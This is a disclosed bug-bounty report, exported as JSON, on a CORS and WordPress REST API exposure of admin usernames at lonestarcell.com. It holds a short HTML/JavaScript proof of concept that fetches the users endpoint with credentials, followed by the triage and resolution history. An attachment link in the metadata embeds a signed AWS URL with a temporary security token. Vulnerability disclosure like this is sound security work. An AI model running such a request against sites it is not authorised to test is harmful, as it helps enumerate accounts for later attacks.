{"id":772744,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzI3NDQ=","url":"https://hackerone.com/reports/772744","title":"Unsafe cors sharing of admin users ","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-01-12T16:31:07.186Z","submitted_at":"2020-01-12T16:31:07.186Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"newbipath12","url":"/newbipath12","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/xSMXaYkYzh6jCxQwdiGL55GJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":41919,"url":"https://hackerone.com/mtn_group","handle":"mtn_group","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/F81QA4NLiRgbof5FRQvj1SJG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/F81QA4NLiRgbof5FRQvj1SJG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"MTN Group","twitter_handle":"","website":"https://www.mtn.com/","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-04-30T23:28:54.397Z","bug_reporter_agreed_on_going_public_at":"2020-03-31T23:28:50.423Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"hello,\n\n\nthe following endpoint https://lonestarcell.com/wp-json/wp/v2/users/ has an unsafe sharing of sensitive information of admin usernames\n\ncheck poc script below :\n\n```html\n\u003chtml\u003e\n     \u003cbody\u003e\n         \u003ch2\u003eCORS PoC\u003c/h2\u003e\n         \u003cdiv id=\"demo\"\u003e\n             \u003cbutton type=\"button\" onclick=\"cors()\"\u003eExploit\u003c/button\u003e\n         \u003c/div\u003e\n         \u003cscript\u003e\n             function cors() {\n             var xhr = new XMLHttpRequest();\n             xhr.onreadystatechange = function() {\n                 if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n                 document.getElementById(\"demo\").innerHTML = alert(this.responseText);\n                 }\n             };\n              xhr.open(\"GET\",\n                       \"https://lonestarcell.com/wp-json/wp/v2/users/\", true);\n             xhr.withCredentials = true;\n             xhr.send();\n             }\n         \u003c/script\u003e\n     \u003c/body\u003e\n \u003c/html\u003e\n```\nIf another domain is allowed by the policy, then that domain can potentially attack users of the application. If a user is logged in to the application, and visits a domain allowed by the policy, then any malicious content running on that domain can potentially retrieve content from the application, and sometimes carry out actions within the security context of the logged in user.\nEven if an allowed domain is not overtly malicious in itself, security vulnerabilities within that domain could potentially be leveraged by an attacker to exploit the trust relationship and attack the application that allows access. CORS policies on pages containing sensitive information should be reviewed to determine whether it is appropriate for the application to trust both the intentions and security posture of any domains granted access.\nRemediation\n=====================\n###Rest API should be visible just for logged admins .\n\n\nbest regards,\n\n## Impact\n\nReferences\n=====================\n\n###https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties","vulnerability_information_html":"\u003cp\u003ehello,\u003c/p\u003e\n\n\u003cp\u003ethe following endpoint \u003ca title=\"https://lonestarcell.com/wp-json/wp/v2/users/\" href=\"/redirect?url=https%3A%2F%2Flonestarcell.com%2Fwp-json%2Fwp%2Fv2%2Fusers%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://lonestarcell.com/wp-json/wp/v2/users/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e has an unsafe sharing of sensitive information of admin usernames\u003c/p\u003e\n\n\u003cp\u003echeck poc script below :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n     \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n         \u003cspan class=\"nt\"\u003e\u0026lt;h2\u0026gt;\u003c/span\u003eCORS PoC\u003cspan class=\"nt\"\u003e\u0026lt;/h2\u0026gt;\u003c/span\u003e\n         \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;demo\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n             \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;button\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonclick=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cors()\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eExploit\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n         \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n         \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n             \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ecors\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n             \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n             \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonreadystatechange\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                 \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereadyState\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estatus\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e200\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                 \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edemo\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponseText\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                 \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n             \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n              \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eGET\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                       \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://lonestarcell.com/wp-json/wp/v2/users/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n             \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewithCredentials\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n             \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n             \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n         \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n     \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n \u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf another domain is allowed by the policy, then that domain can potentially attack users of the application. If a user is logged in to the application, and visits a domain allowed by the policy, then any malicious content running on that domain can potentially retrieve content from the application, and sometimes carry out actions within the security context of the logged in user.\u003cbr\u003e\nEven if an allowed domain is not overtly malicious in itself, security vulnerabilities within that domain could potentially be leveraged by an attacker to exploit the trust relationship and attack the application that allows access. CORS policies on pages containing sensitive information should be reviewed to determine whether it is appropriate for the application to trust both the intentions and security posture of any domains granted access.\u003c/p\u003e\n\n\u003ch1 id=\"remediation\"\u003eRemediation\u003c/h1\u003e\n\n\u003ch3 id=\"rest-api-should-be-visible-just-for-logged-admins\"\u003eRest API should be visible just for logged admins .\u003c/h3\u003e\n\n\u003cp\u003ebest regards,\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003ch1 id=\"references\"\u003eReferences\u003c/h1\u003e\n\n\u003ch3 id=\"https-portswigger-net-research-exploiting-cors-misconfigurations-for-bitcoins-and-bounties\"\u003e\u003ca title=\"https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties\" href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fexploiting-cors-misconfigurations-for-bitcoins-and-bounties\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/h3\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-04-30T23:28:50.453Z","allow_singular_disclosure_after":-20935261.686000086,"singular_disclosure_allowed":true,"vote_count":14,"voters":["mohammedmagdi","newbipath12","harrisoft","ninetynine","realtess","archerl","sa1tama0","mohamed_ajimi01","ppppppig","dsol","and 4 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":34319,"asset_type":"URL","asset_identifier":"Lonestarcell.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6748641,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"sorry i forget the img poc of the header response \n","markdown_message":"\u003cp\u003esorry i forget the img poc of the header response \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-12T16:50:56.729Z","updated_at":"2020-01-12T16:50:56.729Z","actor":{"username":"newbipath12","cleared":false,"url":"/newbipath12","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xSMXaYkYzh6jCxQwdiGL55GJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":682444,"filename":"paint2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oMnQxV5fwrGpGwV7fykJbCEf?response-content-disposition=attachment%3B%20filename%3D%22paint2.png%22%3B%20filename%2A%3DUTF-8%27%27paint2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064952Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=7629bbe366960fabc8c41cd3ceec16349f5b54c48c106ad046fcb7fd38e03ea7"}],"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6765907,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"any update ?","markdown_message":"\u003cp\u003eany update ?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-14T10:29:40.133Z","updated_at":"2020-01-14T10:29:40.133Z","actor":{"username":"newbipath12","cleared":false,"url":"/newbipath12","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xSMXaYkYzh6jCxQwdiGL55GJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6860898,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-24T11:44:04.869Z","updated_at":"2020-01-24T11:44:04.869Z","actor":{"username":"vancora","cleared":false,"url":"/vancora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7355473,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-18T13:05:58.876Z","updated_at":"2020-03-18T13:05:58.876Z","actor":{"username":"vancora","cleared":false,"url":"/vancora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"newbipath12","url":"/newbipath12"},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7498577,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-31T23:28:50.439Z","updated_at":"2020-03-31T23:28:50.439Z","first_to_agree":true,"actor":{"username":"newbipath12","cleared":false,"url":"/newbipath12","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xSMXaYkYzh6jCxQwdiGL55GJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7857724,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-30T23:28:54.552Z","updated_at":"2020-04-30T23:28:54.552Z","actor":{"url":"/mtn_group","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/F81QA4NLiRgbof5FRQvj1SJG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"MTN Group"}},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}